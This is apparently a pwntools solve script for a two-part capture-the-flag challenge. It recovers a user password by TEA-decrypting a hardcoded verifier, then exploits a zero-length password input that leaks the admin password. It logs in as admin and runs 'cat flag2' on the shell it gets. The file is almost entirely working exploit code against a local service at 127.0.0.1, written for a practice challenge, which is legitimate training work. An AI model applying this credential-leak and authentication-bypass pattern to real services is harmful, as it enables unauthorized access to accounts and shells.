from pwn import *
import struct, time

VERIFY = b"\x27\x85\x56\x4a\xb2\x29\xe7\xf1\xa6\xc0\xab\xd7\xd6\x82\xb8\x1b\x4c\x43\xb0\x33\x0d\xb2\xbe\xb8\x10\x7a\x73\x30\x0a\xf3\xff\x59"
KEY = b"\xaa" * 16

def tea_decrypt_block(v, k):
    v0, v1 = struct.unpack("<2I", v)
    k0, k1, k2, k3 = struct.unpack("<4I", k)
    s, delta = 0xC6EF3720, 0x9E3779B9
    for _ in range(32):
        v1 = (v1 - (((v0 << 4) + k2) ^ (v0 + s) ^ ((v0 >> 5) + k3))) & 0xFFFFFFFF
        v0 = (v0 - (((v1 << 4) + k0) ^ (v1 + s) ^ ((v1 >> 5) + k1))) & 0xFFFFFFFF
        s = (s - delta) & 0xFFFFFFFF
    return struct.pack("<2I", v0, v1)

def tea_decrypt(data, key):
    return b"".join(tea_decrypt_block(data[i:i+8], key) for i in range(0, len(data), 8))

user_pass = tea_decrypt(VERIFY, KEY)
log.success(f"User password: {user_pass.rstrip(b'\\x00').decode()}")

#先解决第一部分
r = remote("127.0.0.1", 53347)
#这里的端口是用websoket连接后的
r.recvuntil(b"username\n")
r.send(b"user\n")
r.recvuntil(b"length of your password\n")
r.sendline(b"32")
r.recvuntil(b"input your password\n")
r.send(user_pass.ljust(32, b"\x00"))

r.recvuntil(b"flag1: ")
flag1 = r.recvline().strip().decode()
log.success(f"FLAG1: {flag1}")
r.close()

# 解决password
r = remote("127.0.0.1", 53347)
r.recvuntil(b"username\n")
r.send(b"admin\n")
r.recvuntil(b"length of your password\n")
r.sendline(b"0")
r.recvuntil(b"input your password\n")
r.send(b"B" * 32)

r.recvuntil(b"you input password as ")
data = r.recvuntil(b" (len ")
admin_pass = data[32:].split(b" (len ")[0].ljust(32, b"\x00")
log.success(f"Admin password: {admin_pass.rstrip(b'\\x00').decode()}")
r.close()

# 拿到密码后解决第二部分
r = remote("127.0.0.1", 53347)
r.recvuntil(b"username\n")
r.send(b"admin\n")
r.recvuntil(b"length of your password\n")
r.sendline(b"32")
r.recvuntil(b"input your password\n")
r.send(admin_pass)

r.recvuntil(b"launch your shell\n")
time.sleep(0.3)
r.sendline(b"cat flag2")

flag2 = r.recvline(timeout=3).strip().decode()
log.success(f"flag2: {flag2}")
r.close()

log.success(f"Full flag: {flag1}{flag2}")
